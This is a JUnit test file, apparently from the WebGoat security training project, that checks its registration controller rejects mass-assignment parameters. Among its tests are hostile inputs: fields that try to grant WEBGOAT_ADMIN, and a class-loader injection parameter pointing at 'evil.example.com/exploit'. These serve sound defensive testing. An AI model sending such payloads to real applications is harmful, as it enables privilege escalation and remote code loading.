/*
 * SPDX-FileCopyrightText: Copyright © 2017 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.container.users;

import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;
import static org.springframework.test.web.servlet.setup.MockMvcBuilders.standaloneSetup;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders;
import org.springframework.validation.Errors;

/**
 * Tests for {@link RegistrationController} focusing on the mass-assignment (CWE-915) protection
 * introduced via {@code @InitBinder} / {@code WebDataBinder.setAllowedFields}.
 */
@ExtendWith(MockitoExtension.class)
class RegistrationControllerTest {

  private MockMvc mockMvc;

  @Mock private UserValidator userValidator;
  @Mock private UserService userService;

  @BeforeEach
  void setUp() {
    RegistrationController controller = new RegistrationController(userValidator, userService);
    this.mockMvc = standaloneSetup(controller).build();
  }

  // ── Normal registration flow ────────────────────────────────────────────────

  /**
   * A valid registration request with all expected form fields should succeed
   * and call {@link UserService#addUser} with the submitted username.
   */
  @Test
  void validRegistration_callsAddUserWithSubmittedUsername() throws Exception {
    // userValidator does nothing (no binding errors)
    mockMvc
        .perform(
            MockMvcRequestBuilders.post("/register.mvc")
                .param("username", "validuser")
                .param("password", "secret1")
                .param("matchingPassword", "secret1")
                .param("agree", "agreed"))
        .andExpect(status().is3xxRedirection());

    verify(userService).addUser(eq("validuser"), eq("secret1"));
  }

  /**
   * Missing required fields should result in the registration view being re-rendered
   * (binding-result errors), and {@link UserService#addUser} must NOT be called.
   */
  @Test
  void missingRequiredFields_returnsRegistrationView_andDoesNotAddUser() throws Exception {
    mockMvc
        .perform(
            MockMvcRequestBuilders.post("/register.mvc")
                .param("username", "abc") // too short – @Size(min=6)
                .param("password", "")
                .param("matchingPassword", "")
                .param("agree", "agreed"))
        .andExpect(status().isOk()); // returns the "registration" view

    verify(userService, never()).addUser(anyString(), anyString());
  }

  // ── Mass-assignment protection (CWE-915) ───────────────────────────────────

  /**
   * Extra HTTP parameters beyond the allowed set must be silently ignored by the
   * binder and must NOT influence the call to {@link UserService#addUser}.
   * This verifies that {@code @InitBinder} + {@code setAllowedFields} is in place.
   */
  @Test
  void extraRequestParameters_areIgnored_massAssignmentPrevented() throws Exception {
    // Submit extra fields that are NOT in the allowed-field list
    mockMvc
        .perform(
            MockMvcRequestBuilders.post("/register.mvc")
                .param("username", "validuser")
                .param("password", "secret1")
                .param("matchingPassword", "secret1")
                .param("agree", "agreed")
                // extra parameters that should be silently dropped by the binder
                .param("role", "WEBGOAT_ADMIN")
                .param("enabled", "true")
                .param("authorities", "WEBGOAT_ADMIN"))
        .andExpect(status().is3xxRedirection());

    // addUser is called with only username and password; no privileged field injection
    verify(userService).addUser(eq("validuser"), eq("secret1"));
  }

  /**
   * Submitting a parameter with a name that shadows an internal field (e.g. "class",
   * "class.classLoader") must not cause any unexpected behaviour; the binder should
   * silently discard it.
   */
  @Test
  void classLoaderInjectionParameter_isIgnored() throws Exception {
    mockMvc
        .perform(
            MockMvcRequestBuilders.post("/register.mvc")
                .param("username", "validuser")
                .param("password", "secret1")
                .param("matchingPassword", "secret1")
                .param("agree", "agreed")
                .param("class.classLoader.resources.context.configFile",
                    "http://evil.example.com/exploit"))
        .andExpect(status().is3xxRedirection());

    verify(userService).addUser(eq("validuser"), eq("secret1"));
  }

  // ── Validation errors cause registration page re-render ─────────────────────

  /**
   * When the {@link UserValidator} reports binding errors the controller must
   * return the "registration" view and must NOT invoke {@link UserService#addUser}.
   */
  @Test
  void validatorError_returnsRegistrationView_andDoesNotAddUser() throws Exception {
    // Make the validator add a global error
    org.mockito.Mockito.doAnswer(
            invocation -> {
              Errors errors = invocation.getArgument(1);
              errors.rejectValue("password", "NoMatch", "Passwords do not match");
              return null;
            })
        .when(userValidator)
        .validate(any(), any());

    mockMvc
        .perform(
            MockMvcRequestBuilders.post("/register.mvc")
                .param("username", "validuser")
                .param("password", "secret1")
                .param("matchingPassword", "different")
                .param("agree", "agreed"))
        .andExpect(status().isOk());

    verify(userService, never()).addUser(anyString(), anyString());
  }
}
